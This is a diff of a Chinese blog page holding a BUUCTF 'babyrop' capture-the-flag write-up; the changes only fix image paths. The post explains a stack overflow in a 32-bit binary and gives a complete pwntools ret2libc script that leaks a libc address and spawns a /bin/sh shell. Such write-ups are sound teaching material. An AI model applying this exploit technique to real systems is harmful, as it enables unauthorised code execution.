@@ -23,14 +23,14 @@
 <meta property="og:site_name" content="M4gne51um&#39;s blog">
 <meta property="og:description" content="初级ROP&#x2F;带libc文件&#x2F;32位程序">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/1.png">
-<meta property="og:image" content="http://example.com/2.png">
-<meta property="og:image" content="http://example.com/3.png">
+<meta property="og:image" content="http://example.com/2021/04/22/buuctf-babyrop/1.png">
+<meta property="og:image" content="http://example.com/2021/04/22/buuctf-babyrop/2.png">
+<meta property="og:image" content="http://example.com/2021/04/22/buuctf-babyrop/3.png">
 <meta property="article:published_time" content="2021-04-22T00:58:05.000Z">
 <meta property="article:modified_time" content="2021-04-24T14:03:29.890Z">
 <meta property="article:author" content="Magnesium">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/1.png">
+<meta name="twitter:image" content="http://example.com/2021/04/22/buuctf-babyrop/1.png">
   
   
   
@@ -280,11 +280,11 @@
               <div class="markdown-body">
                 
                 <p>先checksec</p>
-<p><img src="/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/04/22/buuctf-babyrop/1.png" srcset="/img/loading.gif" lazyload></p>
 <p>然后ida，为了自己看起来清晰改了下函数名。</p>
-<p><img src="/2.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/04/22/buuctf-babyrop/2.png" srcset="/img/loading.gif" lazyload></p>
 <p>第一个是计时函数，超过时间就会退出程序。第二个函数如图</p>
-<p><img src="/3.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/04/22/buuctf-babyrop/3.png" srcset="/img/loading.gif" lazyload></p>
 <p>这里我们要做的是在read buf的时候，第一个字符为\0，这样后面的strncmp的v1就是0，就能成功return buf[7]，在第三个函数中，就可以read的字符数为buf[7]，buf的大小是231，要令他栈溢出，就要让buf[7]的值大于231，那么如何才能让一个char值大于231……困扰了我一下，还是看别人的wp，然后才发现原来可以直接输入‘\255’[手动狗头]，又学到了许多。</p>
 <p>然后是找system和binsh，毫无意外的并没有，并且题目附件还给了libc文件</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br><br>context.<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.<span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;i386&#x27;</span><br>context.<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-attribute">sl</span>=lambda x:io.sendline(x)<br><span class="hljs-attribute">rl</span>=lambda :io.recvline()<br><br><span class="hljs-comment">#io=remote(&#x27;node3.buuoj.cn&#x27;,27293)</span><br><span class="hljs-attribute">io</span>=process(&#x27;./pnn&#x27;)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./pnn&#x27;)<br><span class="hljs-attribute">libc</span>=ELF(&#x27;./libc-2.23.so&#x27;)<br><br><span class="hljs-attribute">main</span>=0x8048825<br><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;\0&#x27;</span>*7+&#x27;\255&#x27;<br>sl(payload)#<br>rl()#<br><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*(0xe7+4)+p32(elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(main)+p32(1)+p32(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(4)<br>sl(payload)<br><br><span class="hljs-attribute">write_got</span>=u32(io.recv(4))<br><span class="hljs-attribute">libc_base</span>=write_got-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;\0&#x27;</span>*7+&#x27;\255&#x27;<br>sl(payload)#<br>rl()#<br><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*(0xe7+4)+p32(libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])+p32(0)+p32(libc_base+libc.search(<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>).next())<br>sl(payload)<br>gdb.attach(io)<br>io.interactive()<br></code></pre></td></tr></table></figure>
